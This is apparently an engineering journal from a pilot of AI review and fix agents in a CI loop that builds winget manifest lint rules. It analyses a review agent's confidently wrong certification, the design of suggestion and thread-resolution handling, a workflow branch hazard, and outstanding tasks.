encoding *which InstallerTypes winget unpacks rather than runs* — was defined in **two** places,
in `installer-entry-unique.ts` and again in the new rule. Add a second archive type someday and one
rule updates while the other silently does not. A maintainability failure with no present-day
symptom, which is exactly the category automated checks cannot reach: fixtures test behaviour, the
corpus tests behaviour against real data, and neither has an opinion about duplication.

### …and the review was confidently, specifically wrong about correctness

Unprompted, the review also argued the rule was corpus-safe:

> The converse check (nested fields on a non-archive) is a real winget-cli error, and since winget
> itself rejects such manifests they cannot appear in the known-good corpus, so it will not produce
> false positives.

That is the oracle's own premise, reasoned about by an agent nobody asked to think about it — and
**both of its claims are false.** The corpus then failed with **13 errors**, all from that check.

Ground truth, `winget-cli/src/AppInstallerCommonCore/Manifest/ManifestValidation.cpp:323`: the
entire nested-installer validation block is wrapped in `if (IsArchiveType(...))`. Archive types
*require* `NestedInstallerType` and `NestedInstallerFiles`; non-archive types are **not checked at
all**. There is no converse rule. Komac routinely emits `InstallerType: portable` alongside
`NestedInstallerType` and `NestedInstallerFiles` (that is how a portable gets its
`PortableCommandAlias`), and Microsoft accepts it — `Gruntwork.Terragrunt`, `Navidrome`, `TEdit`,
`iLEAPP`, `g-helper` all do exactly this.

The converse check was never a winget rule. **It was invented in issue #13 — by me** — and is the
third spec error of the pilot, after the identifier segment count and the installer uniqueness key.

**The lesson, and it is the sharpest one here.** The review's argument was specific, domain-aware,
cited the right mechanism, and read as expert. It was also wrong, and it was wrong *in the same
direction as the spec it was reviewing* — both came from the same mistaken belief about winget.
A reviewer that shares the author's wrong premise cannot catch the error, however carefully it
reasons; it will instead produce a confident justification for it. That is worse than silence,
because it manufactures false assurance.

Worth recording that the human (me) then amplified it: the reasoning was praised as a highlight of
the run before the corpus finished. Plausibility is not evidence. **Only the oracle grounded it** —
and the oracle is the only layer here that consults something outside the team's own beliefs.

**The fix discriminated rather than complied.** The review named four duplicated items. The agent
moved three and **declined the fourth with a reason**: `label` is diagnostic-message presentation
("(none)" for an absent value), not manifest domain knowledge, so it carries no drift risk and
reads better beside the messages it formats. That is the distinction the prompt asks for —
*"do not make a change you believe is wrong just because a comment asked for it"* — actually
exercised rather than merely stated. It also renamed `isArchive` → `isArchiveType` for clarity at
module scope, which nobody requested.

**The detail that is easy to miss:** it edited the *already-merged* `installer-entry-unique.ts` to
import the shared helpers. Extracting only for the new rule would have looked like a fix while
leaving the duplication — and the drift risk — exactly where it was. Removing the risk required
touching code outside the PR's original scope, and it did that without being told.

**What the pilot has demonstrated.** The handoff asked whether a CI-driven agent loop is viable.
Across nine implement runs the agent's code has been correct every time; every failure in the
entire pilot was plumbing. The four mechanisms catch genuinely different classes of problem, and
none subsumes another:

| Mechanism | Catches | Blind to |
|---|---|---|
| `npm run verify` | behaviour contradicting its own tests | anything the spec got wrong |
| corpus oracle | **spec** errors nobody on the team knows are errors | design, duplication, style |
| `agent:review` | **design** problems with no runtime symptom | any error it shares the author's premise about |
| `agent:fix` | acts on findings, with the judgement to decline | whatever was never flagged |

The corpus caught a bug in a rule, then a bug in *its own gate*, and now a spec error that the
review had explicitly certified as safe. The review caught a duplication no test could see.

The non-overlap is the finding — but this run sharpens it. Three of the four layers only ever
check the work against *the team's own beliefs*: tests encode them, review reasons from them, fix
acts on that reasoning. When the belief is wrong, those three agree with each other and produce
confident, mutually-reinforcing justification. **Only the corpus consults something external**, and
it is therefore the only layer that can catch a wrong premise rather than a wrong implementation.
Every spec error in this pilot — all three — was caught by the corpus and by nothing else.

---

## 2026-07-25 — The conversation loop: suggestions, replies, resolution

Closed the gap between "the agents exchange data" and "the agents hold a conversation you can
read." Three features (#49, #50), then an end-to-end test on PR #46 that found a flaw in one.

### A Copilot comparison worth recording

The prompting question was whether our reviews use the same machinery as GitHub Copilot's, since
they look different. **They use the same API.** Copilot posts an ordinary pull request review and
is likewise constrained to `COMMENT` — never approve, never request-changes — which is exactly our
`event: "COMMENT"`. The visible differences: it posts as `copilot-pull-request-reviewer[bot]`, it
occupies the *Reviewers* sidebar because it is a requested reviewer (a GitHub App), and it emits
` ```suggestion ` blocks. Only the last is substantive, and it is what we built.

### Design decisions that carried weight

**Only `addressed` resolves; `declined` stays open.** Auto-resolving a decline would let the agent
quietly bury a disagreement. An extra open thread is a far better failure than a silently
dismissed objection.

**Invented thread ids are dropped.** A hallucinated id would not merely fail —
`resolveReviewThread` could close an *unrelated* thread. `filterOutcomes` honours only ids we
actually handed over.

**Suggestions are explicitly not authoritative.** The fix prompt says to verify before applying:
*"a confident reviewer working from a false premise produces a tidy patch that is still wrong."*
That is #46's lesson encoded, and it matters more once suggestions arrive looking ready to apply —
prose invites scrutiny, a patch invites a click.

**Introspect before designing.** Checking the GraphQL schema first showed both
`addPullRequestReviewThreadReply` and `resolveReviewThread` key on the **thread node id**, which
deleted a planned REST `databaseId` mapping layer entirely.

### The test, and what it caught

PR #46 was usefully messy: four unresolved threads, two of them *outdated*, two saying the same
thing. The review produced a correctly-ranged multi-line suggestion (`87-88`); the fix applied it,
replied to all four threads, and resolved two.

**Flaw found — the schema was too narrow.** `addressed` was documented as *"the code was changed
to satisfy the comment."* The two already-satisfied threads were therefore classified `declined`,
which by design leaves them **open forever** — reviving the exact accumulation this machinery
exists to prevent. The agent followed the spec correctly; the spec was wrong. Fixed by making the
test *"is anything still outstanding?"* rather than *"did I personally change something?"*.

That is the **fourth** spec error of the pilot with the same signature: a definition narrower than
the world it describes, written confidently, caught only by running it.

**Second, smaller catch.** The fix reflowed the suggestion rather than pasting it — correct
behaviour — but justified it as preventing the sentence "being truncated." Checking the diff, the
suggestion would have applied cleanly; nothing would have truncated. Right action, wrong reason.
Worth recording precisely because a good outcome hid a bad justification — the same failure mode
that produced the 13 corpus false positives.

### An operational trap, found while setting the test up

`pull_request_target` takes the **workflow YAML** from the base branch, but the job checks out the
**PR head** — so `.sandcastle/` runner scripts come from the PR branch. An agent PR opened before
a script change keeps running the *old* scripts, silently, with no error. #46 needed `main` merged
into it before the test meant anything.

That is a standing hazard for every in-flight agent PR after any `.sandcastle/` change, and a
concrete argument for `agent-update-branch` (`parity.md` §1), whose whole job is refreshing stale
PR branches.

---

## Pending — not yet exercised

The full cycle is proven, including replies and resolution. Still unexercised or outstanding:

- **`agent:fix`'s refusal path has never run.** Every fix run so far had feedback to act on. The
  "no trusted feedback" refusal is implemented but untested.
- **The collaborator-steering path is untested in anger.** `fetchTrustedComments` works (smoke
  tested), but no run has yet been driven by a human comment rather than an agent review.
- **Shared-setup extraction still pending.** Three workflows now duplicate
  checkout → node → npm ci → install-Claude-Code. A composite action is the obvious cleanup.
- **Thread replies are still absent from both review and fix** (`docs/parity.md` §3, §4). Neither
  agent can speak in-thread; fix speaks only through commit messages.
- **`AGENT_PAT` expiry is not tracked.** Set a reminder for the chosen expiry, or the loop dies
  silently with a 401 when it lapses. Highest-priority loose end because it fails invisibly.
- The corpus is a **2.6% stride sample** (4,000 of 155,150) at one pinned SHA. Clean there is
  strong but not exhaustive evidence; a rule could still have a false positive on an unsampled
  manifest. Raising `MAX_PACKAGES` or bumping the pinned SHA are the levers, at the cost of CI
  minutes.
- Corpus `checkout` of winget-pkgs is the slow step (~6 min). Not cached. If it becomes painful,
  caching by SHA is the tunable the original issue (#22) called for.
- Actions are on `@v4` (Node 20 deprecation warning). Bump to `@v5` eventually.
- Remaining backlog rules (~13) are mechanical now. The open question is whether to keep running
  them one-by-one or trust batching several labels at once.
